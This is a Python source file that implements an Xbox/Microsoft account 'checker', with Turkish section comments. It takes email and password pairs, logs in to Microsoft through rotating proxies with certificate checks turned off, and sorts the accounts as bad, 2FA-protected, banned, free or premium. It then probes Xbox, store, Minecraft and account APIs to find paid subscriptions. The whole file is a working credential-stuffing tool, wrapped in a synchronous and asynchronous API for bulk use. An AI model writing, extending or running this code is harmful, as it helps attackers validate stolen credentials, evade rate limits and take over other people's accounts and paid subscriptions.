import asyncio
import re
import time
import json
import random
from threading import Lock
from urllib.parse import urlparse, parse_qs, unquote
import requests
import urllib3

urllib3.disable_warnings()

# ===================== ABONELİK TÜRLERİ =====================
SUB_TYPES = [
    'xbox game pass ultimate',
    'xbox game pass core',
    'pc game pass',
    'game pass console',
    'xbox live gold',
    'ea play',
    'microsoft 365',
    'office 365',
    'onedrive',
    'copilot pro',
    'game pass'
]

# ===================== PROXY MANAGER =====================
class ProxyManager:
    def __init__(self, proxy_list=None):
        self.proxies = proxy_list or []
        self._lock = Lock()
        self.bad_proxies = set()
        self.fail_count = {}

    def has_proxies(self):
        return bool(self.proxies)

    def get(self):
        if not self.proxies:
            return None
        with self._lock:
            self.proxies = [p for p in self.proxies if p not in self.bad_proxies]
            if not self.proxies:
                return None
            p = random.choice(self.proxies)
        
        # Normalize proxy string - handle various formats
        # Expected formats: ip:port, user:pass:ip:port, http://host:port, https://host:port,
        # socks5://host:port, socks4://host:port, user:pass@host:port
        proxy = p.strip()
        lower = proxy.lower()
        
        # Remove protocol prefixes (socks5/, socks4/, http/, https/)
        if lower.startswith('socks5://'):
            proxy = proxy[9:]  # remove 'socks5://' (9 chars)
        elif lower.startswith('socks4://'):
            proxy = proxy[9:]  # remove 'socks4://' (9 chars)
        elif lower.startswith('http://'):
            proxy = proxy[7:]  # remove 'http://'
        elif lower.startswith('https://'):
            proxy = proxy[8:]  # remove 'https://'
        
        # After removing protocol, check for user:pass@host:port format
        at_idx = proxy.find('@')
        if at_idx != -1:
            # Has authentication: user:pass@host:port
            auth_part = proxy[:at_idx]     # user:pass
            host_part = proxy[at_idx + 1:]    # host:port
            
            # Parse user:pass (could be user:pass or just user)
            auth_split = auth_part.split(':', 1)
            user = auth_split[0] if len(auth_split) > 0 else ''
            # pass = auth_split[1] if len(auth_split) > 1 else ''  # not used for URL
            
            # Parse host:port
            hp_split = host_part.split(':', 1)
            host = hp_split[0] if len(hp_split) > 0 else ''
            port = hp_split[1] if len(hp_split) > 1 else ''
            
            if host and port:
                s = f"http://{host}:{port}"
            else:
                # Fallback: just use the host part if port missing
                s = f"http://{host}" if host else f"http://{proxy}"
        else:
            # No @ sign - could be host:port or ip:port
            # Could also be user:pass:ip:port (4 parts from original format)
            parts = proxy.split(':')
            
            if len(parts) >= 4:
                # Original format: user:pass:ip:port
                # parts[0]=user, parts[1]=pass, parts[2]=ip, parts[3]=port
                host = parts[2]
                port = parts[3]
                if host and port:
                    s = f"http://{host}:{port}"
                else:
                    s = f"http://{proxy}"
            elif len(parts) == 3:
                # Possible format: user:ip:port or ip:port:extra
                # Check if parts[0] looks like a user (no dots, short) or ip
                if '.' in parts[0] and len(parts[0]) > 2:
                    # Likely ip:port:extra - take first two parts
                    host = parts[0]
                    port = parts[1]
                    s = f"http://{host}:{port}" if host and port else f"http://{proxy}"
                else:
                    # Could be user:ip:port - skip user, use ip:port
                    host = parts[1]
                    port = parts[2]
                    s = f"http://{host}:{port}" if host and port else f"http://{proxy}"
            elif len(parts) == 2:
                # Standard ip:port or host:port
                host = parts[0]
                port = parts[1]
                if host and port:
                    # Simple validation: port should be numeric
                    try:
                        int(port)
                        s = f"http://{host}:{port}"
                    except ValueError:
                        s = f"http://{proxy}"
                else:
                    s = f"http://{proxy}"
            else:
                # Just a hostname or single part
                s = f"http://{proxy}"
        
        return {"http": s, "https": s}
    
    def mark_bad(self, proxy_str):
        with self._lock:
            self.bad_proxies.add(proxy_str)

# ===================== XBOX CHECKER =====================
class XboxChecker:
    LOGIN_URL = (
        "https://login.live.com/oauth20_authorize.srf"
        "?client_id=00000000402B5328"
        "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
        "&scope=service::user.auth.xboxlive.com::MBI_SSL"
        "&display=touch&response_type=token&locale=en"
    )

    def __init__(self, proxy_manager=None):
        self.proxy_manager = proxy_manager

    def _session(self):
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        if self.proxy_manager:
            proxy = self.proxy_manager.get()
            if proxy:
                s.proxies.update(proxy)
        return s

    def _extract_token(self, url):
        fragment = urlparse(url).fragment
        if not fragment and '#' in url:
            fragment = url.split('#', 1)[1]
        params = parse_qs(fragment)
        return params.get('access_token', [None])[0]

    def _detect_subscription(self, text):
        if not text:
            return None
        text_lower = text.lower()
        for sub in SUB_TYPES:
            if sub in text_lower:
                return sub.upper()
        return None

    def check(self, email, password):
        start_time = time.time()
        try:
            session = self._session()
            
            # === ADIM 1: LOGIN ===
            r1 = session.get(self.LOGIN_URL, timeout=(10, 15))
            sftag_m = re.search(r'value=\\"(.+?)\\"', r1.text)
            url_post_m = re.search(r'"urlPost":"(.+?)"', r1.text)
            
            if not sftag_m or not url_post_m:
                return {"status": "ERROR", "duration": time.time() - start_time,
                        "error": "Could not parse the Microsoft login page (layout changed or blocked)"}
            
            sftag = sftag_m.group(1)
            url_post = url_post_m.group(1)

            r2 = session.post(
                url_post,
                data={
                    'login': email,
                    'loginfmt': email,
                    'passwd': password,
                    'PPFT': sftag,
                    'type': '11',
                    'LoginOptions': '1'
                },
                timeout=(10, 15),
                allow_redirects=True
            )

            ms_token = None

            # === ADIM 2: TOKEN KONTROLÜ ===
            if 'access_token' in r2.url:
                ms_token = self._extract_token(r2.url)
            else:
                r2_lower = r2.text.lower()
                
                if ('incorrect' in r2_lower or 'invalid' in r2_lower or 
                    "doesn't exist" in r2_lower or 'account doesn' in r2_lower or
                    re.search(r'sErrorCode.*?"50126"', r2.text)):
                    return {"status": "BAD", "duration": time.time() - start_time}

                if ('identity/confirm' in r2.url or 'two-step' in r2_lower or 
                    'verify your identity' in r2_lower):
                    return {"status": "2FA", "duration": time.time() - start_time}

                if '/Abuse' in r2.url or 'suspended' in r2_lower:
                    return {"status": "BANNED", "duration": time.time() - start_time}

                form_action_m = re.search(r'<form[^>]*action="([^"]+)"', r2.text)
                if form_action_m:
                    action = form_action_m.group(1)
                    hidden = {}
                    for m in re.finditer(r'<input[^>]+>', r2.text, re.I):
                        inp = m.group()
                        if 'hidden' in inp.lower():
                            n = re.search(r'name="([^"]+)"', inp)
                            v = re.search(r'value="([^"]*)"', inp)
                            if n:
                                hidden[n.group(1)] = v.group(1) if v else ''
                    
                    r3 = session.post(action, data=hidden, timeout=(10, 15), allow_redirects=True)
                    if 'access_token' in r3.url:
                        ms_token = self._extract_token(r3.url)
                    else:
                        ru_m = re.search(r'ru=([^&"\'>\s]+)', action)
                        if not ru_m:
                            ru_m = re.search(r'ru=([^&"\'>\s]+)', r3.url)
                        if ru_m:
                            ru = unquote(ru_m.group(1))
                            r4 = session.get(ru, timeout=(10, 15), allow_redirects=True)
                            if 'access_token' in r4.url:
                                ms_token = self._extract_token(r4.url)

                if not ms_token:
                    return {"status": "BAD", "duration": time.time() - start_time}

            if not ms_token:
                return {"status": "BAD", "duration": time.time() - start_time}

            # === ADIM 3: XBOX AUTH ===
            r_xbl = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json={
                    "Properties": {
                        "AuthMethod": "RPS",
                        "SiteName": "user.auth.xboxlive.com",
                        "RpsTicket": ms_token
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT"
                },
                timeout=(10, 15)
            )
            
            if r_xbl.status_code != 200:
                return {"status": "FREE", "data": {}, "duration": time.time() - start_time}
            
            xbl_data = r_xbl.json()
            xbl_token = xbl_data['Token']
            uhs = xbl_data['DisplayClaims']['xui'][0]['uhs']

            # === ADIM 4: XSTS AUTH ===
            r_xsts = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json={
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                    "RelyingParty": "http://xboxlive.com",
                    "TokenType": "JWT"
                },
                timeout=(10, 15)
            )
            
            gamertag = ""
            gamerscore = 0
            gamepass_type = None
            subscription_details = []
            
            if r_xsts.status_code == 401:
                xerr = r_xsts.json().get('XErr', 0) if r_xsts.text.startswith('{') else 0
                if xerr == 2148916229:
                    return {"status": "BANNED", "duration": time.time() - start_time}
            
            if r_xsts.status_code == 200:
                xsts_token = r_xsts.json()['Token']
                xbl_auth = f"XBL3.0 x={uhs};{xsts_token}"
                
                # === PROFİL ===
                r_prof = session.get(
                    "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore",
                    headers={
                        "Authorization": xbl_auth,
                        "x-xbl-contract-version": "2",
                        "Accept": "application/json"
                    },
                    timeout=(10, 15)
                )
                if r_prof.status_code == 200:
                    settings = r_prof.json().get('profileUsers', [{}])[0].get('settings', [])
                    for s in settings:
                        if s.get('id') == 'Gamertag':
                            gamertag = s.get('value', '')
                        elif s.get('id') == 'Gamerscore':
                            try:
                                gamerscore = int(s.get('value', 0))
                            except:
                                pass

                # === KONTROL 1: Xbox Subscriptions ===
                try:
                    sub_url = "https://subscriptions.xboxlive.com/users/me/subscriptions"
                    sub_headers = {
                        'Authorization': xbl_auth,
                        'Accept': 'application/json',
                        'x-xbl-contract-version': '2'
                    }
                    r_sub = session.get(sub_url, headers=sub_headers, timeout=(10, 15))
                    if r_sub.status_code == 200:
                        sub_data = r_sub.json()
                        for sub in sub_data.get('subscriptions', []):
                            name = sub.get('name', '')
                            state = sub.get('state', '')
                            sub_type = self._detect_subscription(name)
                            if sub_type:
                                subscription_details.append(f"{sub_type}")
                                if state.lower() == 'active':
                                    gamepass_type = sub_type
                                    break
                except:
                    pass

                # === KONTROL 2: Xbox Store ===
                if not gamepass_type:
                    try:
                        store_url = "https://storeedgefd.dsx.mp.microsoft.com/v9.0/users/me/purchases"
                        store_headers = {
                            'Authorization': xbl_auth,
                            'Accept': 'application/json'
                        }
                        r_store = session.get(store_url, headers=store_headers, timeout=(10, 15))
                        if r_store.status_code == 200:
                            store_data = r_store.json()
                            for item in store_data.get('items', []):
                                name = item.get('name', '')
                                sub_type = self._detect_subscription(name)
                                if sub_type:
                                    subscription_details.append(f"{sub_type}")
                                    gamepass_type = sub_type
                                    break
                    except:
                        pass

                # === KONTROL 3: Minecraft API ===
                if not gamepass_type:
                    try:
                        r_mc_xsts = session.post(
                            'https://xsts.auth.xboxlive.com/xsts/authorize',
                            json={
                                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                                "RelyingParty": "rp://api.minecraftservices.com/",
                                "TokenType": "JWT"
                            },
                            timeout=(10, 15)
                        )
                        if r_mc_xsts.status_code == 200:
                            mc_xsts_token = r_mc_xsts.json()['Token']
                            r_mc_auth = session.post(
                                'https://api.minecraftservices.com/authentication/login_with_xbox',
                                json={'identityToken': f"XBL3.0 x={uhs};{mc_xsts_token}"},
                                timeout=(10, 15)
                            )
                            if r_mc_auth.status_code == 200:
                                mc_token = r_mc_auth.json().get('access_token', '')
                                r_ent = session.get(
                                    'https://api.minecraftservices.com/entitlements/mcstore',
                                    headers={'Authorization': f"Bearer {mc_token}"},
                                    timeout=(10, 15)
                                )
                                if r_ent.status_code == 200:
                                    ent_text = r_ent.text.lower()
                                    if 'product_game_pass_ultimate' in ent_text:
                                        gamepass_type = 'GAME PASS ULTIMATE'
                                    elif 'product_game_pass_pc' in ent_text:
                                        gamepass_type = 'PC GAME PASS'
                                    elif 'product_game_pass_extra' in ent_text:
                                        gamepass_type = 'GAME PASS EXTRA'
                                    elif 'product_game_pass_premium' in ent_text:
                                        gamepass_type = 'GAME PASS PREMIUM'
                                    elif 'product_game_pass_core' in ent_text or 'xbox_live_gold' in ent_text:
                                        gamepass_type = 'GAME PASS CORE'
                                    elif 'product_game_pass' in ent_text:
                                        gamepass_type = 'GAME PASS'
                    except:
                        pass

                # === KONTROL 4: Microsoft Account ===
                if not gamepass_type:
                    try:
                        acc_url = "https://account.microsoft.com/api/user"
                        acc_headers = {
                            'Authorization': xbl_auth,
                            'Accept': 'application/json'
                        }
                        r_acc = session.get(acc_url, headers=acc_headers, timeout=(10, 15))
                        if r_acc.status_code == 200:
                            acc_data = r_acc.json()
                            services = acc_data.get('services', {})
                            for svc_name, svc_data in services.items():
                                if 'subscription' in svc_name.lower() or 'pass' in svc_name.lower():
                                    sub_type = self._detect_subscription(svc_name)
                                    if sub_type:
                                        subscription_details.append(f"{sub_type}")
                                        gamepass_type = sub_type
                                        break
                    except:
                        pass

            # === SONUÇ ===
            data = {
                "gamertag": gamertag,
                "gamerscore": gamerscore,
                "subscriptions": list(set(subscription_details)) if subscription_details else []
            }
            
            if gamepass_type:
                data['gamepass'] = gamepass_type
                return {
                    "status": "PREMIUM",
                    "data": data,
                    "duration": time.time() - start_time
                }
            else:
                return {
                    "status": "FREE",
                    "data": data,
                    "duration": time.time() - start_time
                }

        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT", "duration": time.time() - start_time,
                    "error": "Upstream request timed out"}
        except Exception as e:
            return {"status": "ERROR", "duration": time.time() - start_time,
                    "error": f"{type(e).__name__}: {str(e)[:160]}"}


# ===================== PUBLIC API =====================
MAX_PROXIES_PER_REQUEST = 20


def check_account(email: str, password: str, proxies=None) -> dict:
    """Run a single synchronous account check with input validation.

    Returns one of the standard result dicts: ``PREMIUM`` / ``FREE`` /
    ``BAD`` / ``2FA`` / ``BANNED`` / ``TIMEOUT`` / ``ERROR``.
    """
    started = time.time()
    email = (email or "").strip()
    password = password or ""
    if not email or not password:
        return {"status": "ERROR", "duration": 0, "error": "email and password are required"}
    if len(email) > 320 or len(password) > 512:
        return {"status": "ERROR", "duration": 0, "error": "email or password too long"}

    clean_proxies: list[str] = []
    if proxies:
        if not isinstance(proxies, (list, tuple)):
            return {"status": "ERROR", "duration": 0, "error": "proxies must be a list of strings"}
        seen = set()
        for proxy in proxies:
            if not isinstance(proxy, str):
                continue
            proxy = proxy.strip()
            if not proxy or proxy in seen:
                continue
            seen.add(proxy)
            clean_proxies.append(proxy)
            if len(clean_proxies) >= MAX_PROXIES_PER_REQUEST:
                break

    proxy_manager = ProxyManager(clean_proxies) if clean_proxies else None
    try:
        return XboxChecker(proxy_manager=proxy_manager).check(email, password)
    except Exception as exc:  # never let a check raise into the API layer
        return {"status": "ERROR", "duration": time.time() - started, "error": str(exc)[:200]}


async def check_account_async(email: str, password: str, proxies=None) -> dict:
    """Async wrapper that runs the blocking checker in a worker thread."""
    return await asyncio.to_thread(check_account, email, password, proxies)
